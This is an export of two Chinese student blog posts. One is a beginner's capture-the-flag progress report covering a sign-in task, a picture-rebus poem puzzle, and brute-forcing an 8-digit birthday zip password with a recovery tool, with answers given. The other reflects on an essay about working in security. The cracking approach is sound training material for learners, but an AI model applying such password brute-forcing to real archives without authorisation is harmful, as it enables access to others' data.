    <content type="text"><![CDATA[1、解题进度 Misc:Signin √ Misc:Poem √ Misc:Birthday √ We:Calculator × Crypto:What’s RSA？ × Misc:Terminal ×2、解题过程1）Signin解题过程该题并没有太大的技术上的难度，但是由于第一次接触OJ系统，所以在解题前，我认真的阅读了学长发给我的资料，又结合题目的要求，最后将正确答案提交，之后有又认真看了该题的要求，熟悉了提交答案的格式。 2）Poem解题过程 在下载过题中给的图片后，自己先观察了一番，并没有发现什么线索，之后我又将图中每块图像进行了稍微的加工——将图片的名字写在旁边（如图2-1），在锁定关键词“狗”、“梨”、“绳”、“企鹅”等，在谷歌进行搜索，并没有太多线索，之后我想起百度有一个搜图功能，又将图片进行搜索，得到的结果很乱（如图2-2），我将信将疑的看了4-5个结果，发现所有关键字都指向“苟”、“利”、“国”、“民”，之后又将这几个关键词进行了谷歌，然后锁定一句诗句“苟利国家生死已,岂因祸福趋避之”。 第一次将结果提交的时候，未能成功，再次仔细看了题目，要求是8个字，我尝试的删除“，”，再次提交则提交成功。 图 2-1 3）Birthday解题过程 在成功安装软件Advanced Zip Password Recovery，并将加密文件下载以后，我就开始尝试进行自动解密，题目提示：密码为生日密码8位数字组成，我按照提示设置了参数： 全为阿拉伯数字 密码长度8位 第一次解密过程中，程序自动关闭，我没有着急继续解密，而是计算了一下8位数字的密码有100000000种组合方式，这样的话解密时间大大增加。经过思考之后，我从“生日”作为切入点，按照正常寿命为80岁，未成年不满18岁不能办理银行卡，所以（2019-80）~（2019-18），也就是1939年-2011年，于是初始开始为19390000，在等待10分钟左右，文件被解密（19950608）。 4）Calculator、What’s RSA？、Terminal 解题过程 这三道题在读题时，就发现有一些技术不是很了解，于是准备在学习相关技术后，再来进行求解。 3、解题感悟 今天把博客正式创建并对其进行优化后，才开始解题，题目的形式对我来说还是比较新颖的，但是经过创建自己的博客到解出三道题的过程，这对我来说已经有了很快和很大的提升，但是通过解题时发现自己的专业基础还欠缺很多，所以以后我还会努力的提升专业技术，我认为迟早有一天我能够将题库中的所有题目一一解出。]]></content>
      <tags>
        <tag>解题总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《So you want to work in security》”读后感]]></title>
    <url>%2F2019%2F02%2F23%2F2019.02.23%EF%BC%881%EF%BC%89%2F</url>
    <content type="text"><![CDATA[——Author:Muzibing 每一遍阅读之后，文章给我的都是不一样的体会和感悟：第一次阅读这篇文章时，因为单词和句型的阻碍，我并没有完全理解文章内容，但被文章中一些好的观点吸引；抱着深入学习的态度，又进行了二次阅读，这次阅读后文章的整体轮廓在我脑中已经清晰，我对作者的观点也在心里发出称赞，我认为这些观点对我很有帮助；于是又研读了第三遍，在内心产生了自己的想法和观点后，我才开始动笔写下感悟。 文章的某些观点与曲老师给我讲的要求不谋而合。作者给出的观点，让我更加清楚在以后学习中应必备的品格和素质，更让我有信心在研究生阶段学好相关技术。 对在网络与信息安全领域从事者来讲，大部分人的研究方向开始并不是该领域，他们有着不一样的学习背景和经历，但是很多人能够在该领域做得很好，甚至成为本领域的专家，那么在这么长的路上，他们是怎么走下去的？并在技术上不断的有所突破呢？作者给出了答案，一个很重要的因素就是兴趣，其次是学习的态度、方法和信心等。这让我不禁想到自己，本科并不是网络安全相关专业，但是自己对该领域有着很大的兴趣，也自学过这方面的知识和技术，不过过于肤浅，所以研究生报考就毅然选择了网络安全方向，就是想在这方面深入的学习，并有所成绩，努力成为该领域的技术精英，那么这篇文章便给了我很大的鼓舞，让我更有信心在研究生阶段精通相关技术。 随着互联网的快速发展，网络安全领域的技术也在不断飞速地更新、升级，那么现在对于该领域的初学者无疑是增加了不少难度，所以失败也就在所难免，面对失败我们不能惧怕，更不能被击退，要做的是向成功的人学习经验和技术，提升自己的能力。因为我一直相信“天下无难事，只怕有心人”，大多数人之间的智商没有太大的差距，别人的成功也是建立在他们无数次失败的基础上，但他们却从未放弃，只是我们看不见而已，所以我认为别人能做好的事情，我也一定能做好！甚至更好！作者提到的“万事开头难”，让我想起本科期间参加的比赛和项目，每个任务刚开始的时候的确是最难的，这个时候说放弃是一件非常容易的事情，而我就是一个不愿服输的人，所以每次都会努力的克服困难，坚持完成任务。 除了对学习的兴趣及努力的态度，对于网络安全重要的还应有实践，比如在学习中应多参加一些高质量的比赛，在实训中得到锻炼；在学习中应要充分利用好的学习资源，并不断阅读领域专家的相关优秀文章，时刻关注世界前沿技术的发展动态，从而认清差距，在思维上保持先进性，激发学习动力，通过不断提升自身技术，努力追赶并且超越他们，争取成为网络安全领域的精英。 正如作者最后所说，这是一个并不辉煌的工作，并没有电影中的那么炫酷，反之还会很累、很枯燥！而这些问题对我来说早已经做好准备，我会像以前享受解数学难题带来的兴奋和激动，去享受网络安全领域带来的挑战。无论前方的道路多么艰难，我都会拼尽全力去迎接未来！因为我坚信，人的一生不应该活在舒服区，更应该主动地去发现问题、解决问题，最大化的延伸自己的人生价值，而我也会不断学习，在技术上不断突破自我。]]></content>
  </entry>
</search>
